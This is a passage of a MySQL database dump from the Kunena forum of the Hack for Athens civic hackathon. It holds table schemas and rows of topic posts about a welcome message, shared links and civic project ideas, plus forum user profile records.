  UNIQUE KEY `postid` (`postid`,`userid`),
  KEY `userid` (`userid`),
  KEY `targetuserid` (`targetuserid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_kunena_thankyou`
--

LOCK TABLES `hfa_kunena_thankyou` WRITE;
/*!40000 ALTER TABLE `hfa_kunena_thankyou` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_kunena_thankyou` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_kunena_topics`
--

DROP TABLE IF EXISTS `hfa_kunena_topics`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_kunena_topics` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `category_id` int(11) NOT NULL DEFAULT '0',
  `subject` tinytext,
  `icon_id` int(11) NOT NULL DEFAULT '0',
  `locked` tinyint(4) NOT NULL DEFAULT '0',
  `hold` tinyint(4) NOT NULL DEFAULT '0',
  `ordering` int(11) NOT NULL DEFAULT '0',
  `posts` int(11) NOT NULL DEFAULT '0',
  `hits` int(11) NOT NULL DEFAULT '0',
  `attachments` int(11) NOT NULL DEFAULT '0',
  `poll_id` int(11) NOT NULL DEFAULT '0',
  `moved_id` int(11) NOT NULL DEFAULT '0',
  `first_post_id` int(11) NOT NULL DEFAULT '0',
  `first_post_time` int(11) NOT NULL DEFAULT '0',
  `first_post_userid` int(11) NOT NULL DEFAULT '0',
  `first_post_message` text,
  `first_post_guest_name` tinytext,
  `last_post_id` int(11) NOT NULL DEFAULT '0',
  `last_post_time` int(11) NOT NULL DEFAULT '0',
  `last_post_userid` int(11) NOT NULL DEFAULT '0',
  `last_post_message` text,
  `last_post_guest_name` tinytext,
  `params` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `category_id` (`category_id`),
  KEY `locked` (`locked`),
  KEY `hold` (`hold`),
  KEY `posts` (`posts`),
  KEY `hits` (`hits`),
  KEY `first_post_userid` (`first_post_userid`),
  KEY `last_post_userid` (`last_post_userid`),
  KEY `first_post_time` (`first_post_time`),
  KEY `last_post_time` (`last_post_time`)
) ENGINE=InnoDB AUTO_INCREMENT=21 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_kunena_topics`
--

LOCK TABLES `hfa_kunena_topics` WRITE;
/*!40000 ALTER TABLE `hfa_kunena_topics` DISABLE KEYS */;
INSERT INTO `hfa_kunena_topics` VALUES (1,2,'Welcome to the HackForAthens forum!',0,0,0,0,1,98,1,0,0,1,1365023956,254,'[attachment=6]NationalDayofCivicHacking1.pptx[/attachment]\r\nWelcome!\r\n\r\nThe National Day of Civic Hacking will provide citizens an opportunity to do what is most quintessentially American: roll up our sleeves, get involved and work together to improve our society. Web and software developers, designers, community organizers, and other folks from all over Athens will gather to tackle local challenges with technology.\r\n\r\nSolving Real Problems, Helping Real People.\r\n\r\nThe event will focus on building technical solutions, but it is not about the technology; it’s about addressing local problems and challenges. The goal is to produce workable solutions that improve daily life for real people in our communities. The technical solutions we build will be built for a purpose, not just as an exercise.\r\n\r\nWondering if you should attend? See the flyer to the right to see if you can help.\r\n\r\nHack for Athens is one of over 77 events happening nationwide as part of the National Day of Civic Hacking. The National Day of Civic Hacking is an event during which citizens from around the country will work together with local, state and federal governments as well as private sector organizations with the common goal of improving their community. Hack for Athens is also licensed under Random Hacks of Kindness, an organization started by Microsoft, Yahoo, and NASA, and the World Bank to run hackathons around the world.','Kelly Storm',1,1365023956,254,'[attachment=6]NationalDayofCivicHacking1.pptx[/attachment]\r\nWelcome!\r\n\r\nThe National Day of Civic Hacking will provide citizens an opportunity to do what is most quintessentially American: roll up our sleeves, get involved and work together to improve our society. Web and software developers, designers, community organizers, and other folks from all over Athens will gather to tackle local challenges with technology.\r\n\r\nSolving Real Problems, Helping Real People.\r\n\r\nThe event will focus on building technical solutions, but it is not about the technology; it’s about addressing local problems and challenges. The goal is to produce workable solutions that improve daily life for real people in our communities. The technical solutions we build will be built for a purpose, not just as an exercise.\r\n\r\nWondering if you should attend? See the flyer to the right to see if you can help.\r\n\r\nHack for Athens is one of over 77 events happening nationwide as part of the National Day of Civic Hacking. The National Day of Civic Hacking is an event during which citizens from around the country will work together with local, state and federal governments as well as private sector organizations with the common goal of improving their community. Hack for Athens is also licensed under Random Hacks of Kindness, an organization started by Microsoft, Yahoo, and NASA, and the World Bank to run hackathons around the world.','Kelly Storm',''),(12,2,'A quick way to get an API',0,0,0,0,1,20,0,0,0,12,1370115579,256,'https://communities.socrata.com/catalog/ndoch-athens/','Jonathan Wallace',12,1370115579,256,'https://communities.socrata.com/catalog/ndoch-athens/','Jonathan Wallace',''),(13,7,'Github Repo',0,0,0,0,1,24,0,0,0,13,1370142054,268,'Hey guys,\r\n\r\nHere\'s a link to the Github repo I set up: [url=http://github.com/PendragonDevelopment/hack-for-athens]Hack for Athens[/url]\r\n\r\nFork or clone as you\'d like, and post your Github username so I can add you as admins/collaborators.','Jordan Burke',13,1370142054,268,'Hey guys,\r\n\r\nHere\'s a link to the Github repo I set up: [url=http://github.com/PendragonDevelopment/hack-for-athens]Hack for Athens[/url]\r\n\r\nFork or clone as you\'d like, and post your Github username so I can add you as admins/collaborators.','Jordan Burke',''),(15,7,'Google Docs INfo',0,0,0,0,1,29,0,0,0,15,1370206343,324,'Notes:\r\nhttps://docs.google.com/document/d/1QtfaHBaKhbYSMoB4GZDJkteneqlMROgQAK-PoXXk_YU/edit?usp=sharing\r\n\r\nPresentation: https://docs.google.com/presentation/d/1MPMJhxUBgGhy8Bpx_zbuOxrLwGB8iQB-6AcwJDjKPN8/edit?usp=sharing','Sean Dunn',15,1370206343,324,'Notes:\r\nhttps://docs.google.com/document/d/1QtfaHBaKhbYSMoB4GZDJkteneqlMROgQAK-PoXXk_YU/edit?usp=sharing\r\n\r\nPresentation: https://docs.google.com/presentation/d/1MPMJhxUBgGhy8Bpx_zbuOxrLwGB8iQB-6AcwJDjKPN8/edit?usp=sharing','Sean Dunn',''),(16,8,'Synopsis of Solution:',0,0,0,0,1,96,0,0,0,17,1370208519,306,'Synopsis of Solution:\r\nIt is hard to understand the scope of need in Athens and communities throughout the country. We have large datasets such as census data and social quality indexes, but they don’t inform or enable action at the local community level. To affect change requires “small data,” that is real-time, geo-located, and communicates on a human scale. Comm-unity is a solution that gathers information about need within the community while delivering help to those who need it from a mobile app. With this information, an open API, and advanced visualization, various stakeholders will be able directly impact communities across the United States -- as Comm-unity scales efficiently across the existing 211 infrastructure.','Henry Oddi',17,1370208519,306,'Synopsis of Solution:\r\nIt is hard to understand the scope of need in Athens and communities throughout the country. We have large datasets such as census data and social quality indexes, but they don’t inform or enable action at the local community level. To affect change requires “small data,” that is real-time, geo-located, and communicates on a human scale. Comm-unity is a solution that gathers information about need within the community while delivering help to those who need it from a mobile app. With this information, an open API, and advanced visualization, various stakeholders will be able directly impact communities across the United States -- as Comm-unity scales efficiently across the existing 211 infrastructure.','Henry Oddi',''),(17,8,'Presentation',0,0,0,0,1,9,1,0,0,18,1370213215,305,'PowerPoint Presentation: Comm-unity  :woohoo:','Stacey Kerr',18,1370213215,305,'PowerPoint Presentation: Comm-unity  :woohoo:','Stacey Kerr',''),(18,7,'Presentation Slides',4,0,0,0,2,34,1,0,0,19,1370213408,324,':evil: \r\n\r\nGoogle Docs Link: https://docs.google.com/presentation/d/1MPMJhxUBgGhy8Bpx_zbuOxrLwGB8iQB-6AcwJDjKPN8/edit#slide=id.gc7bb25de_038\r\n\r\n\r\n[attachment=3]affordableinternetpres.pptx[/attachment]','Sean Dunn',21,1370215469,268,'Our solution to providing low-income areas with affordable broadband internet access relies upon working with businesses and community organisations to create a wireless mesh network to re-invest unused and underutilised bandwidth back into the community.','Jordan Burke',''),(19,9,'Source Materials For GitHub',0,0,0,0,1,23,1,0,0,20,1370214810,313,'[attachment=4]SafeWaterAthens.zip[/attachment]\r\nSafe Water Athens - a front end for the epa SWDIS database, with a few extra twists.\r\nCode for web in this example.','Chris Sparnicht',20,1370214810,313,'[attachment=4]SafeWaterAthens.zip[/attachment]\r\nSafe Water Athens - a front end for the epa SWDIS database, with a few extra twists.\r\nCode for web in this example.','Chris Sparnicht',''),(20,9,'Source code',0,0,0,0,1,21,1,0,0,22,1370312430,274,'Here\'s the source code for the challenge.','Baron Chandler',22,1370312430,274,'Here\'s the source code for the challenge.','Baron Chandler','');
/*!40000 ALTER TABLE `hfa_kunena_topics` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_kunena_user_categories`
--

DROP TABLE IF EXISTS `hfa_kunena_user_categories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_kunena_user_categories` (
  `user_id` int(11) NOT NULL,
  `category_id` int(11) NOT NULL,
  `role` tinyint(4) NOT NULL DEFAULT '0',
  `allreadtime` datetime DEFAULT NULL,
  `subscribed` tinyint(4) NOT NULL DEFAULT '0',
  `params` text NOT NULL,
  PRIMARY KEY (`user_id`,`category_id`),
  KEY `category_subscribed` (`category_id`,`subscribed`),
  KEY `role` (`role`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_kunena_user_categories`
--

LOCK TABLES `hfa_kunena_user_categories` WRITE;
/*!40000 ALTER TABLE `hfa_kunena_user_categories` DISABLE KEYS */;
INSERT INTO `hfa_kunena_user_categories` VALUES (254,0,1,NULL,0,'');
/*!40000 ALTER TABLE `hfa_kunena_user_categories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_kunena_user_read`
--

DROP TABLE IF EXISTS `hfa_kunena_user_read`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_kunena_user_read` (
  `user_id` int(11) NOT NULL,
  `topic_id` int(11) NOT NULL,
  `category_id` int(11) NOT NULL,
  `message_id` int(11) NOT NULL,
  `time` int(11) NOT NULL,
  UNIQUE KEY `user_topic_id` (`user_id`,`topic_id`),
  KEY `category_user_id` (`category_id`,`user_id`),
  KEY `time` (`time`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_kunena_user_read`
--

LOCK TABLES `hfa_kunena_user_read` WRITE;
/*!40000 ALTER TABLE `hfa_kunena_user_read` DISABLE KEYS */;
INSERT INTO `hfa_kunena_user_read` VALUES (254,1,2,1,1370224102),(254,17,8,18,1370213964),(254,18,7,19,1370213951),(268,12,2,12,1370194943),(268,13,7,13,1370142055),(268,15,7,15,1370206360),(268,18,7,21,1370215470),(274,19,9,20,1370312229),(274,20,9,22,1370312431),(305,17,8,18,1370213216),(306,16,8,17,1370208520),(313,19,9,20,1370221095),(324,15,7,15,1370214820),(324,18,7,21,1370215891);
/*!40000 ALTER TABLE `hfa_kunena_user_read` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_kunena_user_topics`
--

DROP TABLE IF EXISTS `hfa_kunena_user_topics`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_kunena_user_topics` (
  `user_id` int(11) NOT NULL DEFAULT '0',
  `topic_id` int(11) NOT NULL DEFAULT '0',
  `category_id` int(11) NOT NULL,
  `posts` mediumint(8) NOT NULL DEFAULT '0',
  `last_post_id` int(11) NOT NULL DEFAULT '0',
  `owner` tinyint(4) NOT NULL DEFAULT '0',
  `favorite` tinyint(4) NOT NULL DEFAULT '0',
  `subscribed` tinyint(4) NOT NULL DEFAULT '0',
  `params` text NOT NULL,
  UNIQUE KEY `user_topic_id` (`user_id`,`topic_id`),
  KEY `topic_id` (`topic_id`),
  KEY `posts` (`posts`),
  KEY `owner` (`owner`),
  KEY `favorite` (`favorite`),
  KEY `subscribed` (`subscribed`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_kunena_user_topics`
--

LOCK TABLES `hfa_kunena_user_topics` WRITE;
/*!40000 ALTER TABLE `hfa_kunena_user_topics` DISABLE KEYS */;
INSERT INTO `hfa_kunena_user_topics` VALUES (254,1,2,1,1,1,0,0,''),(256,12,2,1,12,1,0,1,''),(268,13,7,1,13,1,0,1,''),(268,18,7,1,21,0,0,1,''),(274,20,9,1,22,1,0,1,''),(305,17,8,1,18,1,0,1,''),(306,16,8,1,17,1,0,1,''),(313,19,9,1,20,1,0,1,''),(324,15,7,1,15,1,0,0,''),(324,18,7,1,19,1,0,1,'');
/*!40000 ALTER TABLE `hfa_kunena_user_topics` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_kunena_users`
--

DROP TABLE IF EXISTS `hfa_kunena_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_kunena_users` (
  `userid` int(11) NOT NULL DEFAULT '0',
  `view` varchar(8) NOT NULL DEFAULT '',
  `signature` text,
  `moderator` int(11) DEFAULT '0',
  `banned` datetime DEFAULT NULL,
  `ordering` int(11) DEFAULT '0',
  `posts` int(11) DEFAULT '0',
  `avatar` varchar(255) DEFAULT NULL,
  `karma` int(11) DEFAULT '0',
  `karma_time` int(11) DEFAULT '0',
  `group_id` int(4) DEFAULT '1',
  `uhits` int(11) DEFAULT '0',
  `personalText` tinytext,
  `gender` tinyint(4) NOT NULL DEFAULT '0',
  `birthdate` date NOT NULL DEFAULT '0001-01-01',
  `location` varchar(50) DEFAULT NULL,
  `icq` varchar(50) DEFAULT NULL,
  `aim` varchar(50) DEFAULT NULL,
  `yim` varchar(50) DEFAULT NULL,
  `msn` varchar(50) DEFAULT NULL,
  `skype` varchar(50) DEFAULT NULL,
  `twitter` varchar(50) DEFAULT NULL,
  `facebook` varchar(50) DEFAULT NULL,
  `gtalk` varchar(50) DEFAULT NULL,
  `myspace` varchar(50) DEFAULT NULL,
  `linkedin` varchar(50) DEFAULT NULL,
  `delicious` varchar(50) DEFAULT NULL,
  `friendfeed` varchar(50) DEFAULT NULL,
  `digg` varchar(50) DEFAULT NULL,
  `blogspot` varchar(50) DEFAULT NULL,
  `flickr` varchar(50) DEFAULT NULL,
  `bebo` varchar(50) DEFAULT NULL,
  `websitename` varchar(50) DEFAULT NULL,
  `websiteurl` varchar(50) DEFAULT NULL,
  `rank` tinyint(4) NOT NULL DEFAULT '0',
  `hideEmail` tinyint(1) NOT NULL DEFAULT '1',
  `showOnline` tinyint(1) NOT NULL DEFAULT '1',
  `thankyou` int(11) DEFAULT '0',
  PRIMARY KEY (`userid`),
  KEY `group_id` (`group_id`),
  KEY `posts` (`posts`),
  KEY `uhits` (`uhits`),
  KEY `banned` (`banned`),
  KEY `moderator` (`moderator`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_kunena_users`
--

LOCK TABLES `hfa_kunena_users` WRITE;
/*!40000 ALTER TABLE `hfa_kunena_users` DISABLE KEYS */;
INSERT INTO `hfa_kunena_users` VALUES (254,'','',1,NULL,0,1,'',0,0,1,10,'',1,'0001-01-01','','','','','','','','','','','','','','','','','','Black Box Operations','blackboxoperations.com',0,1,1,0),(255,'',NULL,0,NULL,0,0,NULL,0,0,1,3,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(256,'',NULL,0,NULL,0,1,NULL,0,1369487488,1,3,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(257,'',NULL,0,NULL,0,0,NULL,0,0,1,3,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(258,'',NULL,0,NULL,0,0,NULL,0,0,1,2,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(259,'',NULL,0,NULL,0,0,NULL,0,0,1,1,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(260,'',NULL,0,NULL,0,0,NULL,0,0,1,1,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(261,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(262,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(263,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(264,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(265,'',NULL,0,NULL,0,0,NULL,0,0,1,1,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(266,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(267,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(268,'','',0,NULL,0,2,'users/avatar268.JPG',0,1369494559,1,0,'',1,'1983-12-08','Athens, GA','','','','','','PendragonDev','','','','http://www.linkedin.com/in/jordankburke','','','','','','','Pendragon Development','http://www.pendragondevelopment.com',0,1,1,0),(269,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(270,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(271,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(272,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(273,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(274,'',NULL,0,NULL,0,1,NULL,0,0,1,1,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(275,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(276,'',NULL,0,NULL,0,0,NULL,0,0,1,1,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(277,'',NULL,0,NULL,0,0,NULL,0,0,1,1,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(278,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(279,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(280,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(281,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(282,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(283,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(284,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(285,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(286,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(287,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(288,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(289,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(290,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(291,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(292,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(293,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(294,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(295,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(296,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(297,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(298,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(299,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(300,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(301,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(302,'',NULL,0,NULL,0,0,NULL,-2,0,1,3,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(303,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(304,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(305,'',NULL,0,NULL,0,1,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(306,'',NULL,0,NULL,0,1,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(307,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(308,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(309,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,1,1,0),(310,'',NULL,0,NULL,0,0,NULL,0,0,1,0,NULL,0,'0001-01-01',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,